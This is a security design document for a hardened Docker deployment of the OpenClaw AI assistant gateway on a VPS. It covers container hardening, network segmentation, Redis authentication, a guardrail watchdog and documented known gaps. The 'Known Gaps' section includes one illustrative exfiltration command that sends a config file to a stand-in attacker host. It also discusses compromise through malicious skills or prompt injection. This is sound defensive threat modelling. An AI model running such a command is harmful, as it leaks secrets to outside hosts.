# OpenClaw Deploy — System Design

**Date:** 2026-03-02
**Status:** Approved
**Scope:** Phase 1 — Personal + Public Template

---

## 1. Product Intent

A hardened, internet-facing deployment of OpenClaw running as a persistent Gateway daemon on a single VPS. Serves as both a personal AI assistant and a publishable open-source deployment template.

Not multi-tenant. Not SaaS. Not Kubernetes. Phase 1 only.

---

## 2. Architecture

```
Internet
   │
   │ :443 only
   ▼
┌─────────────────────────────────────────┐
│              VPS (Hetzner)              │
│                                         │
│  ┌──────────────────────────────────┐   │
│  │         Docker Compose           │   │
│  │                                  │   │
│  │  ┌────────┐   [ingress network]  │   │
│  │  │  Caddy │ ◄─── HTTPS/443       │   │
│  │  └───┬────┘                      │   │
│  │      │                           │   │
│  │  ┌───▼──────────────────────┐    │   │
│  │  │  openclaw (hardened)     │    │   │
│  │  │  - Gateway daemon        │    │   │
│  │  │  - Telegram + WhatsApp   │    │   │
│  │  │  - LLM + tools           │    │   │
│  │  │  - non-root, cap_drop    │    │   │
│  │  └───┬──────────────────────┘    │   │
│  │      │  [internal network]       │   │
│  │  ┌───▼────┐                      │   │
│  │  │ Redis  │  (session store)     │   │
│  │  └────────┘                      │   │
│  │                                  │   │
│  │  /data volume (writable only)    │   │
│  └──────────────────────────────────┘   │
│                                         │
│  UFW: 22 (SSH) + 443 only               │
│  Fail2ban, unattended-upgrades          │
└─────────────────────────────────────────┘
```

### Network Segmentation

| Service   | ingress network | internal network |
|-----------|:--------------:|:----------------:|
| Caddy     | ✅             | ❌               |
| OpenClaw  | ✅             | ✅               |
| Redis     | ❌             | ✅               |

Redis is unreachable from Caddy and from the internet. This is enforced explicitly in `docker-compose.yml` — not just implied.

---

## 3. Container Hardening (OpenClaw)

```yaml
openclaw:
  image: openclaw/openclaw:latest
  user: "1000:1000"
  read_only: true
  tmpfs:
    - /tmp
  volumes:
    - openclaw_data:/data
  cap_drop:
    - ALL
  security_opt:
    - no-new-privileges:true
    - seccomp:default
  mem_limit: 2g
  cpus: 1.5
  pids_limit: 256
  restart: unless-stopped
  networks:
    - ingress
    - internal
```

**Notes:**
- `mem_limit` and `cpus` are the correct keys for standalone `docker-compose` (not Swarm). The `deploy.resources` block is silently ignored outside Swarm mode — do not use it.
- If `seccomp:default` breaks OpenClaw, fall back to `seccomp:unconfined` and document the syscalls needed. Do not silently use unconfined.
- The `/data` volume is the only writable surface. It is the primary attack persistence surface — back it up and monitor it.
- No Docker socket. No privileged mode. No host mounts.

### `/data` Volume Permissions

The container runs as UID 1000. The `openclaw_data` volume must be owned by UID 1000 or the container will fail to write (or silently fall back to root in some images). The provision script must run:

```bash
docker run --rm -v openclaw_data:/data busybox chown -R 1000:1000 /data
```

before first start. This is documented in `scripts/provision.sh` and the security checklist.

---

## 4. VPS Hardening

Handled by `scripts/provision.sh`:

- UFW: deny all inbound, allow 22 + 443
- SSH: key-only auth, disable password login, disable root login
- Fail2ban: SSH jail enabled
- Unattended security upgrades enabled
- No other services running on the host

### Optional: Outbound Egress Allowlisting (Phase 1.5)

The provision script includes a commented-out UFW outbound allowlist block. Phase 1 ships with it disabled and documented. Enabling it restricts outbound traffic to known API endpoints:

```bash
# Example — uncomment in provision.sh to enable
ufw default deny outgoing
ufw allow out to any port 53    # DNS
ufw allow out to any port 123   # NTP
ufw allow out to api.telegram.org port 443
ufw allow out to api.anthropic.com port 443
ufw allow out to api.openai.com port 443
# Add WhatsApp/Twilio endpoints as needed
```

Even providing this as commented scaffolding significantly elevates the public template.

---

## 4b. Redis Hardening

Redis runs on the `internal` network only, but defense-in-depth requires authentication even so. If OpenClaw is compromised, an attacker with access to the internal network can reach Redis — a password prevents unauthenticated reads of session data.

```yaml
redis:
  image: redis:7-alpine
  command: redis-server --requirepass ${REDIS_PASSWORD} --bind 0.0.0.0 --protected-mode yes
  restart: unless-stopped
  networks:
    - internal
  volumes:
    - redis_data:/data
```

- `REDIS_PASSWORD` is set in `.env` (gitignored), generated randomly at setup
- `--protected-mode yes` is the Redis default; made explicit
- No port exposed to host — only reachable via the `internal` Docker network
- OpenClaw must be configured with the Redis password via env var

---

## 5. Secrets Model

- `.env` is gitignored — never committed
- `.env.example` is committed with all required variables documented and empty
- Secrets are injected via `env_file` in compose
- Categories: messaging tokens (Telegram, WhatsApp), LLM API keys
- No cloud IAM credentials on host
- No host credential directories mounted into containers

---

## 6. Skills Model

- Skills live inside the container image or in the `/data` volume
- No dynamic remote skill installs enabled by default
- Third-party skills are explicitly high-risk — documented in README
- ClawHub-style attack surface (arbitrary skill execution) is the primary skill-layer risk

---

## 7. Reliability

- `restart: unless-stopped` on all containers
- Log persistence via Docker default logging driver
- `/data` volume backup: documented procedure in `docs/upgrade-path.md`
- Basic monitoring: `docker stats`, `ctop`
- Accepted limitations: single node, single failure domain, manual upgrades

---

## 8. Known Gaps (Documented in Threat Model)

### Gap 1 — Outbound Egress (Phase 1 — unrestricted)
Docker allows all outbound traffic by default. A compromised OpenClaw container can exfiltrate data to arbitrary hosts (`curl evil.com/exfil?data=$(cat /data/config)`). Phase 1 ships with outbound unrestricted and documents this explicitly. Phase 1.5 introduces the commented UFW outbound allowlist in `provision.sh`.

Allowlist targets:
- `api.telegram.org`
- WhatsApp / Meta Cloud API endpoints
- LLM provider endpoints (Anthropic, OpenAI)
- NTP (123), DNS (53)

### Gap 2 — `/data` as Persistence Surface
If OpenClaw is compromised (via a malicious skill, prompt injection, or tool abuse), the attacker can write arbitrary files to `/data`. These files persist across container restarts. **Container compromise = `/data` compromise.** This is accepted for Phase 1. Mitigation: monitor `/data` for unexpected files, rotate secrets if compromise is suspected, treat backups as potentially tainted.

### Gap 3 — No Isolation Between Skills and Core Runtime
Skills execute inside the same container process as the Gateway. There is no sandbox boundary between a skill and OpenClaw internals. A malicious skill can read session data, credentials, and write to `/data`. This is documented in the README under the skills warning. Dynamic remote skill installs are disabled by default.

### Gap 4 — No Per-Session Abort
OpenClaw does not expose a `session abort` RPC. The guardrail system (see Section 8b) enforces limits by killing the entire OpenClaw process (`kill -TERM`), which drops all active sessions. Docker restarts the container. This is coarse but safe — a violation in one session terminates all sessions. Documented prominently in `docs/execution-guardrails.md`.

---

## 8b. Execution Guardrail System

An external log-driven watchdog that enforces session limits without modifying OpenClaw.

### Design Principles
- Observe, don't intercept
- Session-scoped detection, process-scoped enforcement (Phase 1 limitation)
- Fail closed on violation
- Stateless guardrail process (state is in-memory, per-session)
- Deterministic limits via env vars

### Architecture

```
OpenClaw (Gateway daemon)
   │
   │  openclaw logs --json --follow
   ▼
guardrail.py (background process, same container)
   │
   ├─ session state machine (NEW → ACTIVE → COMPLETED | ABORTED)
   ├─ limit enforcer
   └─ kill -TERM <openclaw_pid>  →  Docker restarts container
```

### Limits Enforced

| Limit | Env var | Default |
|-------|---------|---------|
| Max session duration | `MAX_SESSION_SECONDS` | 300 |
| Max tool calls per session | `MAX_TOOL_CALLS` | 50 |
| Max LLM calls per session | `MAX_LLM_CALLS` | 30 |
| Max idle time (no events) | `MAX_IDLE_SECONDS` | 60 |
| Memory threshold | `MAX_MEMORY_PCT` | 90 |

### Abort Behavior

`openclaw session abort <id>` does not exist. Abort is process-level:

```bash
kill -TERM <openclaw_pid>   # graceful
# if still running after 10s:
kill -KILL <openclaw_pid>   # force
```

Docker `restart: unless-stopped` brings the container back up. **All active sessions are dropped on any violation.** This is a known Phase 1 limitation — documented in `docs/execution-guardrails.md`.

### Manual Kill Switch

If `/data/GUARDRAIL_DISABLE` exists, guardrail terminates OpenClaw immediately and refuses to restart it. Requires manual file removal + `make up` to resume.

### Deployment (Model A — Same Container)

Entrypoint script runs guardrail as a supervised background process before handing off to OpenClaw:

```bash
#!/bin/sh
# Supervised restart loop — guardrail must not silently disappear
while true; do
  python3 /app/guardrail.py
  echo "[guardrail] crashed or exited, restarting in 5s..."
  sleep 5
done &

exec openclaw gateway
```

Guardrail crashing does not crash OpenClaw. OpenClaw crashing triggers Docker restart policy. The restart loop ensures guardrail is always running while the container is alive.

### Repo Additions

```
scripts/guardrail.py          # log consumer + session enforcer + watchdog
docs/execution-guardrails.md  # limits, abort behavior, failure modes, tuning
```

### What This Covers and Doesn't Cover

| Risk | Mitigated? |
|------|-----------|
| Infinite tool loops | Yes |
| Excessive LLM calls | Yes |
| Long-running sessions | Yes |
| Memory runaway | Yes (watchdog) |
| CPU spin | Partially (watchdog threshold) |
| Token burn spiral | Mostly |
| Per-session isolation | No — violation kills all sessions |
| Container escape | No — container layer handles that |
| Data exfiltration | No — needs egress control (Phase 2) |

---

## 9. Repo Structure

```
openclaw-deploy/
├── docker-compose.yml        # hardened stack
├── Caddyfile                 # TLS reverse proxy config
├── entrypoint.sh             # supervised guardrail launch + exec openclaw gateway
├── .env.example              # all vars documented, values empty
├── .env                      # gitignored
├── .gitignore
├── Makefile                  # make up/down/logs/backup/update
├── README.md                 # setup, threat model summary, upgrade path
├── scripts/
│   ├── guardrail.py          # log-driven session watchdog
│   └── provision.sh          # VPS hardening (UFW, fail2ban, SSH, /data permissions)
└── docs/
    ├── architecture.md           # ASCII diagram + network topology explanation
    ├── threat-model.md           # full threat model + known gaps
    ├── security-checklist.md     # pre-launch checklist
    ├── execution-guardrails.md   # limits, abort behavior, failure modes, tuning
    └── upgrade-path.md           # how to update OpenClaw + backup /data
```

---

## 10. Evolution Path

| Phase | Change |
|-------|--------|
| Phase 2 | Outbound egress allowlisting |
| Phase 2 | Application-level execution guardrails |
| Phase 3 | Replace Redis with SQS (swap `internal` service) |
| Phase 3 | Move to ECS (swap compose for task definitions) |
| Phase 4 | Per-user workspace isolation |

No tight coupling between layers — each evolution replaces one service without redesigning the rest.

---

## 11. Success Criteria (Phase 1)

- [ ] Telegram + WhatsApp both working through OpenClaw Gateway
- [ ] OpenClaw container running non-root with cap_drop ALL
- [ ] Redis unreachable from internet
- [ ] One exposed port: 443
- [ ] VPS provisioning script idempotent and documented
- [ ] README publishable with confidence
- [ ] Threat model explicitly documents known gaps
- [ ] Architecture explainable in one diagram
- [ ] Container resource limits verified effective (`docker stats` shows enforced limits, not ignored `deploy:` block)
- [ ] Redis requires authentication — unauthenticated connections rejected
- [ ] `/data` volume permissions validated: owned by UID 1000, container writes succeed as non-root
- [ ] Guardrail process running in container (`ps` shows `guardrail.py`)
- [ ] Guardrail correctly parses OpenClaw structured JSON log stream
- [ ] Limit violation triggers process kill + Docker restart (verified in test)
- [ ] `/data/GUARDRAIL_DISABLE` kill switch verified effective
